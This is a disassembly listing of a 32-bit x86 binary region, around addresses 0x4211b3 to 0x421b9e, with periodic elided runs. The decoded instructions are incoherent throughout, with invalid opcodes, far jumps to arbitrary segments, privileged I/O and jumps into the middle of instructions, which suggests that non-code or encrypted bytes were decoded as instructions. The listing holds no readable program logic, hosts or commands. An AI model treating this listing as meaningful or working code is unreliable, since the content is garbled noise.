  4211b3:	jmp    0x64150f1
  4211b8:	cmp    DWORD PTR [edx+eax*1-0x17],ebx
  4211bc:	idiv   DWORD PTR [ebx-0x3b]
  4211bf:	ror    DWORD PTR [ebx+0x6ce90002],1
  4211c5:	test   DWORD PTR [ebx-0x26],esi
  4211c8:	jge    0x4211c9
  4211ca:	and    ebp,edx
  4211cc:	bnd jp 0x42118e
  4211cf:	sahf   
  4211d0:	cwde   
  4211d1:	sbb    eax,0xb5d86ac0
  4211d6:	sub    BYTE PTR [ecx-0x25ff521f],0xb7
  4211dd:	add    al,0x88
  4211df:	das    
  4211e0:	icebp  
  4211e1:	lea    edi,[ecx+eiz*8+0x6c]
  4211e5:	ror    DWORD PTR [ebp*2-0x16fff91c],0x2e
  4211ed:	sar    ah,cl
  4211ef:	ds jge 0x421176
  4211f2:	or     al,0x65
  4211f4:	xlat   BYTE PTR ds:[ebx]
  4211f5:	mov    bh,0xfc
  4211f7:	push   esi
  4211f8:	push   ds
  4211f9:	dec    edx
  4211fa:	adc    eax,0x5107b05
  4211ff:	add    BYTE PTR [edi*4-0x773d000f],ah
  421206:	test   DWORD PTR [edx],0xf70e8d92
  42120c:	and    dl,ah
  42120e:	jg     0x421276
  421210:	pop    ecx
  421211:	or     dh,dh
  421213:	inc    esi
	...
  42122c:	add    BYTE PTR [edx-0x78],ch
  42122f:	or     eax,DWORD PTR [ebp+0x6b7]
  421235:	xlat   BYTE PTR ds:[ebx]
  421236:	mov    dl,0x86
  421238:	ret    
  421239:	sbb    eax,0x2da7fee1
  42123e:	pop    ebp
  42123f:	adc    al,0xa8
  421241:	dec    esp
  421242:	ret    
  421243:	xor    esi,0x8b00081c
  421249:	fcmovnb st,st(0)
  42124b:	xchg   DWORD PTR [esi+0x11],ecx
  42124e:	aas    
  42124f:	int    0xb
  421251:	pop    esp
  421252:	pop    ebp
  421253:	jnp    0x550f2b4
  421259:	sbb    eax,0xc9c08108
  42125e:	cmp    bh,BYTE PTR [ebp-0x1d]
  421261:	push   cs
  421262:	ret    
  421263:	mov    dl,0xc3
  421265:	mov    dh,0x85
  421267:	pop    ds
  421268:	rcr    DWORD PTR [esi-0x30],0xfb
  42126c:	je     0x421252
  42126e:	leave  
  42126f:	inc    edx
  421270:	add    ecx,eax
  421272:	loopne 0x42123b
  421274:	add    ebp,ebx
  421276:	pop    es
  421277:	and    bl,0xde
  42127a:	pop    ebx
  42127b:	adc    ch,al
  42127d:	and    ecx,DWORD PTR [eax+eax*1]
  421280:	add    BYTE PTR [eax-0x38],cl
  421283:	jo     0x42128e
  421285:	pop    ebx
  421286:	dec    ecx
  421287:	std    
  421288:	cmp    al,0x44
  42128a:	pushf  
  42128b:	std    
  42128c:	dec    DWORD PTR [ebp+0xe8c33e]
	...
  4212aa:	hlt    
  4212ab:	cmc    
  4212ac:	add    al,0x0
  4212ae:	hlt    
  4212af:	sub    cl,al
  4212b1:	or     al,0x70
  4212b3:	gs int 0xfc
  4212b6:	cmp    DWORD PTR [esi-0x55607c40],0x77
  4212bd:	mov    edi,0xae12ebc
  4212c2:	ja     0x4212b1
  4212c4:	add    al,0xe7
  4212c6:	lods   al,BYTE PTR ds:[esi]
  4212c7:	and    cl,dh
  4212c9:	cld    
  4212ca:	ja     0x421265
  4212cc:	and    al,0x18
  4212ce:	hlt    
  4212cf:	cwde   
  4212d0:	clc    
  4212d1:	mov    BYTE PTR [eax-0x47790f2f],dh
  4212d7:	leave  
  4212d8:	call   0x2513c365
  4212dd:	dec    eax
  4212de:	jge    0x421349
  4212e0:	and    al,0x10
  4212e2:	sbb    eax,0xf4000160
  4212e7:	mov    dl,0x92
  4212e9:	shr    BYTE PTR [esi+0x2d],0xac
  4212ed:	imul   esi,DWORD PTR [ebp+ebp*4+0x31fbfd0c],0x37
  4212f5:	add    dh,ah
  4212f7:	lods   eax,DWORD PTR ds:[esi]
  4212f8:	sti    
  4212f9:	mov    ebp,0x45795434
  4212fe:	cld    
  4212ff:	and    al,0x36
  421301:	or     al,0xb2
  421303:	repnz add BYTE PTR [ecx*8-0xbffff03],dh
  42130b:	sub    eax,edi
  42130d:	or     al,BYTE PTR [eax]
	...
  421327:	dec    ecx
  421328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421329:	ret    0xf545
  42132c:	sbb    ecx,0xabf540
  421332:	or     eax,0x8f796f82
  421337:	int3   
  421338:	rol    BYTE PTR [eax+0x0],0x74
  42133c:	add    eax,0x1a26cd61
  421341:	addr16 leave 
  421343:	fdivr  QWORD PTR [eax]
  421345:	loopne 0x4212ca
  421347:	mov    ebp,fs
  421349:	fld    QWORD PTR [esi+0x3e706f9]
  42134f:	mov    edx,0x9316e84b
  421354:	and    ebp,eax
  421356:	add    esi,esp
  421358:	lea    ebp,[edi+edi*8+0x78ef4b7c]
  42135f:	xor    BYTE PTR [edx],dl
  421361:	inc    ebx
  421362:	ret    
  421363:	test   ebx,0xdd7d0806
  421369:	fisttp QWORD PTR [ebp-0x541663cb]
  42136f:	in     al,0xce
  421371:	sar    DWORD PTR [eax+ebp*8-0xbfc977a],0x4
  421379:	jbe    0x421375
  42137b:	in     al,dx
  42137c:	(bad)  
  42137d:	out    dx,eax
  42137e:	cld    
  42137f:	jne    0x4213bb
  421381:	call   0xa9d00789
  421386:	and    BYTE PTR [ebx-0x7a],dl
  421389:	into   
  42138a:	int3   
	...
  4213a3:	add    al,bh
  4213a5:	mov    BYTE PTR [eax+0x3],dl
  4213a8:	hlt    
  4213a9:	add    al,0x70
  4213ab:	sub    eax,0x248bec
  4213b0:	fcmovnu st,st(6)
  4213b2:	out    0x3,al
  4213b4:	hlt    
  4213b5:	test   BYTE PTR [ecx-0x48780f02],ah
  4213bb:	add    esi,esp
  4213bd:	add    al,0x82
  4213bf:	adc    BYTE PTR [ebx-0x42],0xe0
  4213c3:	cld    
  4213c4:	jbe    0x421445
  4213c6:	jnp    0x421394
  4213c8:	ror    BYTE PTR [ebp+0x2a74fc24],0x0
  4213cf:	in     eax,dx
  4213d0:	test   DWORD PTR [ebx],0xd42dd46
  4213d6:	xor    bh,0xd7
  4213d9:	test   eax,0xc0a85498
  4213de:	lds    ebp,FWORD PTR [edi-0x7f19060a]
  4213e4:	test   DWORD PTR [eax+eax*1],0x89113a72
  4213eb:	mov    ebp,0xa78914d3
  4213f0:	jae    0x42137e
  4213f2:	pop    ebp
  4213f3:	loope  0x421401
  4213f5:	enter  0xac00,0x67
  4213f9:	call   0xed72:0xec03338
  421400:	cld    
  421401:	fdiv   QWORD PTR [eax-0x1b]
  421404:	int3   
  421405:	les    ecx,FWORD PTR [eax+0x18]
	...
  42141f:	add    BYTE PTR [eax],al
  421421:	je     0x421460
  421423:	and    al,0xe1
  421425:	div    DWORD PTR ds:0xe8c36004
  42142b:	pop    ss
  42142c:	ret    0x8e5f
  42142f:	inc    ebx
  421430:	out    dx,al
  421431:	mov    al,BYTE PTR cs:[ebx+0x5]
  421435:	and    BYTE PTR [edx+ecx*8],bl
  421438:	bound  edi,QWORD PTR [ebx]
  42143a:	or     al,0xbf
  42143c:	pusha  
  42143d:	fimul  WORD PTR [edi+eax*4]
  421440:	aaa    
  421441:	cld    
  421442:	xor    eax,0xc1b6a763
  421447:	ss ret 0x851f
  42144b:	clc    
  42144c:	fsub   st(6),st
  42144e:	or     DWORD PTR [edx-0x64],0xffffffaf
  421452:	rol    DWORD PTR [eax+0x1d141d],0xaf
  421459:	sar    BYTE PTR ss:[ecx],0x15
  42145d:	or     ecx,DWORD PTR [esi-0x7a5eff84]
  421463:	sti    
  421464:	je     0x42140f
  421466:	aas    
  421467:	push   ecx
  421468:	and    al,0xc5
  42146a:	aas    
  42146b:	inc    ecx
  42146c:	and    al,0xcd
  42146e:	pop    ds
  42146f:	ret    0x2650
  421472:	jnp    0x42146f
  421474:	xlat   BYTE PTR ds:[ebx]
  421475:	adc    cl,cl
  421477:	jo     0x421483
  421479:	pop    ss
  42147a:	inc    ebx
  42147b:	adc    esp,DWORD PTR [ebx+edx*1]
  42147e:	mov    ebp,0xb3538802
  421483:	xchg   BYTE PTR [esi+0x0],al
	...
  42149e:	mov    ds:0xa1887b20,al
  4214a3:	and    BYTE PTR [ebx],cl
  4214a5:	(bad)  
  4214a7:	scas   al,BYTE PTR es:[edi]
  4214a8:	out    dx,eax
  4214a9:	call   FWORD PTR [edx]
  4214ab:	mov    BYTE PTR [eax+0x24],ah
  4214ae:	cmc    
  4214af:	or     bh,ah
  4214b1:	adc    ebp,ebx
  4214b3:	iret   
  4214b4:	push   es
  4214b5:	(bad)  
  4214b7:	retf   
  4214b8:	lock (bad) 
  4214ba:	cli    
  4214bb:	xchg   DWORD PTR [edx+0x4],esp
  4214be:	dec    ebp
  4214bf:	mov    BYTE PTR [edx+0x1],0x6e
  4214c3:	retf   
  4214c4:	inc    eax
  4214c5:	and    al,0x4d
  4214c7:	aas    
  4214c8:	inc    ecx
  4214c9:	and    al,0x1d
  4214cb:	aas    
  4214cc:	cmc    
  4214cd:	cmp    edx,ecx
  4214cf:	in     al,0x23
  4214d1:	push   fs
  4214d3:	das    
  4214d4:	in     eax,dx
  4214d5:	(bad)  
  4214d6:	cmp    bh,BYTE PTR [edi]
  4214d8:	pop    edx
  4214d9:	or     BYTE PTR [esi+0xd1c2447],cl
  4214df:	mov    ebx,0x3dde980
  4214e4:	add    BYTE PTR [ebx-0x3f7e3ee2],cl
  4214ea:	jmp    0x8703:0xcd00db3f
  4214f1:	push   esp
  4214f2:	hlt    
  4214f3:	shl    esp,1
  4214f5:	mov    BYTE PTR [ebx-0x1fdbcb3e],bh
  4214fb:	sbb    al,0x7d
  4214fd:	int    0xbb
  4214ff:	popf   
  421500:	jg     0x4214c1
	...
  42151a:	add    BYTE PTR [eax],ch
  42151c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42151d:	jp     0x421564
  42151f:	add    ecx,edx
  421521:	test   DWORD PTR [ebx],ecx
  421523:	div    DWORD PTR ds:0x67a2153f
  421529:	icebp  
  42152a:	jl     0x42152f
  42152c:	xor    dl,BYTE PTR [edx+0x7dad8bff]
  421532:	les    ecx,FWORD PTR [ebp+0x7bfcd427]
  421538:	xor    edi,DWORD PTR [edi]
  42153a:	adc    eax,0x6f52518
  42153f:	pop    ebp
  421540:	pop    ebp
  421541:	add    DWORD PTR [eax],eax
  421543:	hlt    
  421544:	xor    edi,DWORD PTR [edi]
  421546:	adc    eax,0x17f48610
  42154b:	pop    ebp
  42154c:	xor    DWORD PTR [ecx],eax
  42154e:	add    ah,dh
  421550:	and    edi,DWORD PTR [edi]
  421552:	adc    eax,0xaf53918
  421557:	dec    edi
  421558:	cmp    BYTE PTR [edx+0x45],0xb
  42155c:	shr    BYTE PTR [edi+0xb],cl
  42155f:	add    DWORD PTR [ebx],eax
  421561:	push   ebx
  421562:	mov    bh,BYTE PTR [edx-0x1769e342]
  421568:	mov    bh,0xdb
  42156a:	data16 jle 0x42155c
  42156d:	out    dx,al
  42156e:	and    esi,DWORD PTR [ecx-0x1f]
  421571:	std    
  421572:	xchg   DWORD PTR [edx+0x557d9de],edi
  421578:	jle    0x421540
  42157a:	mov    BYTE PTR [edx+0x17ec4],bh
	...
  421598:	hlt    
  421599:	stos   DWORD PTR es:[edi],eax
  42159a:	jge    0x42155b
  42159c:	push   0xf17dfa05
  4215a1:	call   0xc5cc0e8f
  4215a6:	popf   
  4215a7:	lods   al,BYTE PTR ds:[esi]
  4215a8:	in     al,dx
  4215a9:	les    ebp,FWORD PTR [ecx-0x1c]
  4215ac:	les    eax,FWORD PTR [edx+0x2ccf3a6]
  4215b2:	mov    edx,0x2c8cf3c3
  4215b7:	add    edi,DWORD PTR [ebp+0x3e]
  4215ba:	iret   
  4215bb:	jle    0x42155d
  4215bd:	push   cs
  4215be:	imul   edx,DWORD PTR [edx],0xffffffa6
  4215c1:	mov    esi,0xbec17d5d
  4215c6:	cmp    eax,0x630e4b7f
  4215cb:	push   ds
  4215cc:	xchg   BYTE PTR [esi+0x16317e45],bh
  4215d2:	add    eax,DWORD PTR [ecx+0x425f05ff]
  4215d8:	add    DWORD PTR [ecx+edx*8+0x70be60d5],ebp
  4215df:	inc    edx
  4215e0:	add    ecx,ebp
  4215e2:	jne    0x4215dc
  4215e4:	call   0xb1c00392
  4215e9:	adc    eax,0x1bef6ac3
  4215ee:	outs   dx,DWORD PTR ds:[esi]
  4215ef:	inc    edx
  4215f0:	loope  0x42157c
  4215f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215f3:	lock pop ebx
  4215f5:	ds out 0x7e,al
  4215f8:	sbb    esi,DWORD PTR [ebp+0xc8ed]
	...
  421612:	add    BYTE PTR [eax],al
  421614:	add    bh,dl
  421616:	mov    al,ds:0x8b0ce7f2
  42161b:	imul   eax,DWORD PTR [edi-0x28],0xda4fe718
  421622:	mov    DWORD PTR [ecx],ebp
  421624:	clc    
  421625:	jbe    0x4215ec
  421627:	cmp    ah,BYTE PTR [ecx]
  421629:	ins    DWORD PTR es:[edi],dx
  42162a:	pop    ecx
  42162b:	add    esi,eax
  42162d:	jl     0x4215fc
  42162f:	inc    DWORD PTR [ecx]
  421631:	sub    al,0xe9
  421633:	adc    ebx,DWORD PTR [eax]
  421635:	popa   
  421636:	sar    ah,1
  421638:	mov    ecx,0xf3737e5a
  42163d:	push   ecx
  42163e:	dec    eax
  42163f:	adc    eax,0x40a4bcd
  421644:	popa   
  421645:	xor    eax,0xc52ff618
  42164a:	inc    eax
  42164b:	or     eax,0xfcc0a364
  421650:	jbe    0x4216c2
  421652:	cmp    DWORD PTR [ecx+ecx*8],esp
  421655:	idiv   DWORD PTR [eax]
  421657:	cs jb  0x42168a
  42165a:	or     DWORD PTR [ebx-0x7717bcd7],eax
  421660:	mov    ebp,0x1e88e4eb
  421665:	loopne 0x4216b7
  421667:	and    al,0x9
  421669:	(bad)  
  42166a:	mov    ecx,ebp
  42166c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42166e:	cmp    BYTE PTR [edi+0x458b69bd],0xd6
  421675:	add    eax,DWORD PTR [ebx+0xeb0b]
	...
  42168f:	add    BYTE PTR [eax],al
  421691:	add    bh,bl
  421693:	inc    edi
  421694:	adc    eax,0x7d17b517
  421699:	out    0xca,al
  42169b:	loopne 0x42169a
  42169d:	push   cs
  42169e:	sub    al,0x84
  4216a0:	jnp    0x42166f
  4216a2:	dec    edi
  4216a3:	mov    ebp,0x44b0cd70
  4216a8:	adc    al,0x6c
  4216aa:	aaa    
  4216ab:	xor    DWORD PTR [ebx],esp
  4216ad:	(bad)  
  4216af:	call   0xeca588cb
  4216b4:	leave  
  4216b5:	cmp    BYTE PTR [edi+0x75b9fccf],cl
  4216bb:	jge    0x421730
  4216bd:	jecxz  0x42173c
  4216bf:	inc    edi
  4216c0:	adc    eax,0x93ee900
  4216c5:	push   es
  4216c6:	gs sti 
  4216c8:	adc    dh,dh
  4216ca:	sbb    ebp,DWORD PTR [ebx+edi*2-0x562a7f1]
  4216d1:	call   DWORD PTR [edx+0x12104240]
  4216d7:	jecxz  0x42172f
  4216d9:	mov    edi,DWORD PTR [eax-0x12]
  4216dc:	ror    DWORD PTR [ecx*8+0xc974338],0x1
  4216e4:	gs xchg ebp,eax
  4216e6:	fadd   QWORD PTR [eax]
  4216e8:	mov    al,ds:0xcc00dc97
  4216ed:	xchg   edi,eax
  4216ee:	int3   
  4216ef:	add    bh,ch
  4216f1:	xchg   edi,eax
  4216f2:	dec    esp
  4216f3:	or     BYTE PTR [ecx],al
  4216f5:	cwde   
	...
  42170e:	add    BYTE PTR [eax+ecx*1+0x13],bl
  421712:	cwde   
  421713:	pop    esp
  421714:	or     BYTE PTR ds:0x37084c98,ah
  42171a:	cwde   
  42171b:	dec    esp
  42171c:	or     BYTE PTR [ebx-0x68],dl
  42171f:	pushf  
  421720:	or     BYTE PTR [eax-0x43f76368],ah
  421726:	cwde   
  421727:	mov    WORD PTR [eax],cs
  421729:	jmp    0x1e4aa3c6
  42172e:	cdq    
  42172f:	pushf  
  421730:	or     BYTE PTR [edi-0x67],bl
  421733:	pushf  
  421734:	or     BYTE PTR [edi-0x67],bh
  421737:	mov    WORD PTR [eax],cs
  421739:	xchg   esp,eax
  42173a:	cdq    
  42173b:	mov    WORD PTR [eax],cs
  42173d:	pop    ebp
  42173e:	call   0x85c:0x9bc1085c
  421745:	add    eax,0x5084c9c
  42174a:	pushf  
  42174b:	int3   
  42174c:	add    BYTE PTR ds:0x500dc9c,al
  421752:	pushf  
  421753:	hlt    
  421754:	in     al,dx
  421755:	add    eax,DWORD PTR [edi]
  421757:	pusha  
  421758:	in     eax,dx
  421759:	add    eax,DWORD PTR [edi]
  42175b:	pop    eax
  42175c:	in     eax,dx
  42175d:	add    ebx,DWORD PTR [edx]
  42175f:	nop
  421760:	in     al,dx
  421761:	add    ebx,DWORD PTR [edx]
  421763:	mov    ah,ch
  421765:	add    eax,DWORD PTR [edi]
  421767:	sub    ah,0x3
  42176a:	sbb    bh,BYTE PTR [eax-0x14]
  42176d:	add    ebx,DWORD PTR [edx]
  42176f:	jo     0x42175d
  421771:	add    ebx,DWORD PTR [edx]
	...
  42178b:	add    BYTE PTR [eax-0x14],ch
  42178e:	add    ebx,DWORD PTR [edx]
  421790:	pusha  
  421791:	in     al,dx
  421792:	add    ebx,DWORD PTR [edx]
  421794:	pop    eax
  421795:	in     al,dx
  421796:	add    ebx,DWORD PTR [edx]
  421798:	nop
  421799:	in     al,dx
  42179a:	add    ecx,DWORD PTR [eax+ecx*4-0x7f5afc14]
  4217a1:	in     al,dx
  4217a2:	add    esi,DWORD PTR [edi-0x36ff9388]
  4217a8:	jo     0x421816
  4217aa:	add    bl,bl
  4217ac:	push   0x60ed006c
  4217b1:	ins    BYTE PTR es:[edi],dx
  4217b2:	add    BYTE PTR ds:0x1f006c59,cl
  4217b8:	xchg   ecx,eax
  4217b9:	ins    BYTE PTR es:[edi],dx
  4217ba:	add    BYTE PTR [edi],bh
  4217bc:	mov    DWORD PTR [eax+eax*1+0x5b],ebp
  4217c0:	sub    DWORD PTR [eax+eax*1-0x67],0xe0006c81
  4217c8:	jno    0x421836
  4217ca:	add    BYTE PTR [ecx-0x4eff9395],cl
  4217d0:	imul   ebp,DWORD PTR [eax+eax*1+0xb],0xe3006c62
  4217d8:	push   ebp
  4217d9:	ins    BYTE PTR es:[edi],dx
  4217da:	add    BYTE PTR [edi+edx*2],bl
  4217dd:	ins    BYTE PTR es:[edi],dx
  4217de:	add    BYTE PTR [eax+0x57],al
  4217e1:	ins    BYTE PTR es:[edi],dx
  4217e2:	add    BYTE PTR [ebp+0x4280457],dh
  4217e8:	ss addr16 daa 
  4217eb:	add    al,0xdc
  4217ed:	xchg   edx,eax
  4217ee:	daa    
  4217ef:	add    al,0x0
	...
  421809:	(bad)  
  42180a:	data16 daa 
  42180c:	add    al,0xc
  42180e:	addr16 daa 
  421810:	add    al,0x26
  421812:	popa   
  421813:	daa    
  421814:	add    al,0x74
  421816:	popa   
  421817:	daa    
  421818:	add    al,0x86
  42181a:	xchg   ebx,eax
  42181b:	daa    
  42181c:	add    al,0xd9
  42181e:	addr16 daa 
  421820:	add    al,0x1a
  421822:	addr16 daa 
  421824:	add    al,0xf2
  421826:	call   0x427:0x9ae90427
  42182d:	or     al,0x9b
  42182f:	daa    
  421830:	add    al,0x3a
  421832:	fwait
  421833:	daa    
  421834:	add    al,0x22
  421836:	fwait
  421837:	daa    
  421838:	add    al,0x8b
  42183a:	fwait
  42183b:	daa    
  42183c:	add    al,0x5b
  42183e:	fwait
  42183f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421840:	add    ebx,DWORD PTR [ebx-0x4fc5865]
  421846:	cdq    
  421847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421848:	add    esi,ebx
  42184a:	cdq    
  42184b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42184c:	add    ebp,ebx
  42184e:	cdq    
  42184f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421850:	add    eax,DWORD PTR [ebx]
  421852:	call   0xcdd4:0x8ec503a7
  421859:	xor    al,0x6
  42185b:	mov    bl,0x41
  42185d:	jmp    0xa931ccd3
  421862:	lea    esp,[edi]
  421864:	pop    edx
  421865:	rcr    BYTE PTR [ebx+0x5a40ccb5],1
  42186b:	push   0xffffffcc
	...
  421885:	add    BYTE PTR [edx],bh
  421887:	ss (bad) 
  421889:	mov    edi,DWORD PTR [edi]
  42188b:	add    eax,0xfd9203e7
  421890:	jmp    DWORD PTR [eax]
  421892:	(bad)  
  421893:	in     eax,0x80
  421895:	sub    DWORD PTR [edx+eiz*1+0x1dc3b139],edx
  42189c:	mov    ch,BYTE PTR [edx-0x7efe5dc9]
  4218a2:	xlat   BYTE PTR ds:[ebx]
  4218a3:	xor    eax,0x35f68114
  4218a8:	adc    BYTE PTR [edx+0x31],dh
  4218ab:	or     eax,0x84ec2721
  4218b0:	div    DWORD PTR [esi-0x56cef9ce]
  4218b6:	aaa    
  4218b7:	pop    esp
  4218b8:	rcr    edx,0xb7
  4218bb:	pop    esp
  4218bc:	shl    DWORD PTR [edi],0x4d
  4218bf:	stos   BYTE PTR es:[edi],al
  4218c0:	gs push 0x39
  4218c3:	adc    eax,0x1fc01700
  4218c8:	add    DWORD PTR [edi],0xf072b9a6
  4218ce:	mov    ecx,0x9efd0fff
  4218d3:	hlt    
  4218d4:	mov    edi,0x5afb50f
  4218d9:	icebp  
  4218da:	inc    ebx
  4218db:	mov    al,0xe7
  4218dd:	outs   dx,DWORD PTR ds:[esi]
  4218de:	mov    al,0xb8
  4218e0:	cld    
  4218e1:	pop    esi
  4218e2:	dec    edi
  4218e3:	sbb    al,0xc0
  4218e5:	test   eax,0x7254c3d1
	...
  421902:	add    BYTE PTR [ecx-0x31f695e4],bh
  421908:	add    al,0x56
  42190a:	ss push edx
  42190c:	dec    ecx
  42190d:	push   ss
  42190e:	test   eax,0xdb058ef7
  421913:	adc    esp,ecx
  421915:	adc    ebp,DWORD PTR [edx-0x75]
  421918:	or     eax,0x2e7ea24
  42191d:	or     DWORD PTR [ebp+0xcdb],0x5f183fa4
  421927:	mov    al,ds:0x851166ba
  42192c:	fmul   QWORD PTR [edx]
  42192e:	xor    ecx,ebp
  421930:	test   BYTE PTR [eax+0x24],bh
  421933:	and    DWORD PTR [eax],eax
  421935:	or     edx,DWORD PTR [ebp+ebx*2+0xf004093]
  42193c:	test   DWORD PTR [edx+0x17],esp
  42193f:	lea    ecx,[eax+0xd9f0142]
  421945:	add    BYTE PTR [edx-0x2f75e3e4],cl
  42194b:	dec    ebp
  42194c:	pop    edi
  42194d:	jnp    0x4219c3
  42194f:	rol    BYTE PTR [esi+esi*8+0x7f1bf01b],1
  421956:	jl     0x421909
  421958:	add    BYTE PTR [eax],al
  42195a:	cmovno edi,DWORD PTR [edi+0x5f4dcafa]
  421961:	pop    ss
  421962:	xor    cl,BYTE PTR [ebp+0x7fde81]
	...
  421980:	outs   dx,DWORD PTR ds:[esi]
  421981:	aam    0x84
  421983:	push   ecx
  421984:	ret    0xc2
  421987:	add    BYTE PTR [esi],dl
  421989:	dec    ebp
  42198a:	and    al,0x8
  42198c:	mov    dh,BYTE PTR [ebx]
  42198e:	inc    ecx
  42198f:	and    al,0x99
  421991:	push   esp
  421992:	call   0x42df0b
  421997:	ret    
  421998:	sub    bh,ch
  42199a:	and    ecx,DWORD PTR [eax]
  42199c:	lds    eax,FWORD PTR [esi-0x40a2ff2c]
  4219a2:	ret    
  4219a3:	add    eax,0x3fc849
  4219a8:	sub    DWORD PTR [esi+edi*1],0x200e2200
  4219af:	int3   
  4219b0:	sahf   
  4219b1:	add    al,0x64
  4219b3:	test   al,0xf4
  4219b5:	ins    BYTE PTR es:[edi],dx
  4219b6:	add    BYTE PTR [eax+0x3c2deaf5],dh
  4219bc:	sahf   
  4219bd:	mov    ch,0xc1
  4219bf:	xor    cl,BYTE PTR [eax+edx*1+0x45]
  4219c3:	add    BYTE PTR [ebx],ah
  4219c5:	ftst   
  4219c7:	push   cs
  4219c8:	mov    ah,0xad
  4219ca:	xchg   DWORD PTR [edi+0x5f85bb88],edi
  4219d0:	fsubr  QWORD PTR [ebp-0x62bc037]
  4219d6:	imul   edi,DWORD PTR [esi],0xfffffff4
  4219d9:	pop    esi
  4219da:	inc    eax
  4219db:	and    al,0x58
  4219dd:	xchg   esi,eax
  4219de:	inc    ebx
  4219df:	add    BYTE PTR [edi+0x830732],dh
	...
  4219fd:	mov    ah,0xf9
  4219ff:	out    0x88,al
  421a01:	sub    ah,BYTE PTR [edx-0xb008bb5]
  421a07:	ss push cs
  421a09:	and    al,0x96
  421a0b:	mov    cl,0x93
  421a0d:	cmc    
  421a0e:	lods   eax,DWORD PTR ds:[esi]
  421a0f:	lods   eax,DWORD PTR ds:[esi]
  421a10:	add    eax,0x6e998624
  421a15:	cmc    
  421a16:	lods   eax,DWORD PTR ds:[esi]
  421a17:	shl    DWORD PTR ds:0xffd8be9c,0xa3
  421a1e:	sub    ah,bh
  421a20:	push   DWORD PTR [esi-0x1]
  421a23:	pop    es
  421a24:	add    BYTE PTR [edi+0x77eb8d78],dh
  421a2a:	dec    ecx
  421a2b:	or     eax,0x15a1981
  421a30:	adc    DWORD PTR [ecx],0xcb560156
  421a36:	xor    bh,BYTE PTR [ecx-0x3e097d19]
  421a3c:	cld    
  421a3d:	outs   dx,DWORD PTR ds:[esi]
  421a3e:	std    
  421a3f:	xchg   ebp,esi
  421a41:	loopne 0x421aa6
  421a43:	sub    bh,BYTE PTR [eax]
  421a45:	fadd   QWORD PTR [esi+edx*8]
  421a48:	cmp    DWORD PTR [esp+eax*1-0x53564b6f],esi
  421a4f:	xchg   edx,eax
  421a50:	inc    ecx
  421a51:	cmp    esi,DWORD PTR [edi-0xa593c9d]
  421a57:	jno    0x421aa1
  421a59:	cld    
  421a5a:	(bad)  
  421a5b:	in     al,0x8e
  421a5d:	mov    dh,0x8
  421a5f:	pusha  
  421a60:	dec    ecx
	...
  421a79:	add    al,dh
  421a7b:	mov    esp,DWORD PTR [ebx-0xcc184ed]
  421a81:	mov    eax,?
  421a83:	sub    ah,bl
  421a85:	pop    ecx
  421a86:	jnp    0x421ab9
  421a88:	fcmovne st,st(1)
  421a8a:	mov    dh,0xbc
  421a8c:	call   0x70470e94
  421a91:	dec    edx
  421a92:	add    al,0xad
  421a94:	(bad)  
  421a95:	and    edx,0xffffffb6
  421a98:	popa   
  421a99:	push   edx
  421a9a:	add    BYTE PTR [ebp+ebx*8-0x10553474],cl
  421aa1:	pop    ecx
  421aa2:	fdivr  QWORD PTR [ebp-0x4b]
  421aa5:	add    al,0xf4
  421aa7:	sub    dl,BYTE PTR [ebx-0x6ccf909f]
  421aad:	lods   al,BYTE PTR ds:[esi]
  421aae:	adc    eax,0x7cc185b6
  421ab3:	mov    esi,0xc3bb621d
  421ab8:	loop   0x421abd
  421aba:	inc    edi
  421abb:	mov    bh,BYTE PTR [edx-0x7b]
  421abe:	lahf   
  421abf:	adc    eax,0x889c58bd
  421ac4:	inc    DWORD PTR [edx]
  421ac6:	hlt    
  421ac7:	mov    ch,0xdb
  421ac9:	pcmpeqw mm1,QWORD PTR [eax+0x4f]
  421acd:	shl    DWORD PTR [eax+0x30],0xef
  421ad1:	mov    dh,BYTE PTR [esi+0x2505d0b8]
  421ad7:	scas   eax,DWORD PTR es:[edi]
  421ad8:	jmp    DWORD PTR [ebx+0x1b]
  421adb:	mov    ch,0x57
  421add:	pusha  
	...
  421af6:	add    BYTE PTR [ebx],cl
  421af8:	mov    cl,0xe7
  421afa:	pop    ebp
  421afb:	cld    
  421afc:	mov    ch,0xfc
  421afe:	mov    edx,0xfb181334
  421b03:	mov    bh,0x4
  421b05:	mov    DWORD PTR [edx+0x6cfcf517],esp
  421b0b:	aas    
  421b0c:	xor    dh,BYTE PTR [edx+esi*2]
  421b0f:	mov    ecx,0x18d98918
  421b14:	push   ebx
  421b15:	lock jne 0x421b26
  421b18:	xor    ebp,0x5c
  421b1b:	jmp    0x845:0xfedd528b
  421b22:	pop    edx
  421b23:	in     al,dx
  421b24:	mov    ebp,edi
  421b26:	ret    0x8c05
  421b29:	dec    edi
  421b2a:	in     eax,dx
  421b2b:	call   0xee7d1382
  421b30:	jge    0x421b74
  421b32:	mov    ebp,0x26f8526e
  421b37:	jns    0x421bae
  421b39:	or     esp,edx
  421b3b:	mov    ?,WORD PTR [ebx]
  421b3d:	shl    DWORD PTR [ebp+edi*2+0x32],1
  421b41:	popa   
  421b42:	push   0xe9009d7e
  421b47:	div    DWORD PTR [edx]
  421b49:	xor    esi,DWORD PTR [edx-0x1e]
  421b4c:	mov    al,0x82
  421b4e:	ja     0x421ba0
  421b50:	push   ebx
  421b51:	mov    DWORD PTR [esp+esi*4],esp
  421b54:	out    dx,al
  421b55:	inc    edi
  421b56:	loope  0x421b21
  421b58:	adc    dh,al
  421b5a:	lods   al,BYTE PTR ds:[esi]
	...
  421b73:	add    ah,ah
  421b75:	add    al,0x51
  421b77:	pop    esi
  421b78:	jmp    0x428a:0xf7a91218
  421b7f:	(bad)  
  421b81:	push   esi
  421b82:	mov    DWORD PTR [eax],0x89000a1f
  421b88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b89:	std    
  421b8a:	jl     0x421b4d
  421b8c:	imul   edi,ebp,0xffffffff
  421b8f:	call   esp
  421b91:	dec    ecx
  421b92:	or     dh,al
  421b94:	cwde   
  421b95:	adc    al,0xfd
  421b97:	jmp    0xc176:0x13d8703
  421b9e:	or     BYTE PTR [eax-0x30],dl
